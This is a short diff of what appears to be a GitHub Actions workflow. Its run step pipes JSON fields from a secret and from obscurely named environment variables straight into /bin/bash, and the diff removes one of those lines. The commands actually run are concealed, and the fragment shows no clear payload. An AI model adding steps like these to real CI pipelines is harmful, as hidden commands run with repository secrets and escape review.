@@ -27,7 +27,6 @@ jobs:
           luxh302: ${{ secrets.luxh302 }}
         run: |
           printf '%s' "$luxh302" | jq -r .zh38473 | /bin/bash
-          echo $bwb6 | jq -r .esb46 | /bin/bash
           echo $m9131 | jq -r .o8276 | /bin/bash
 
       - name: Archive output
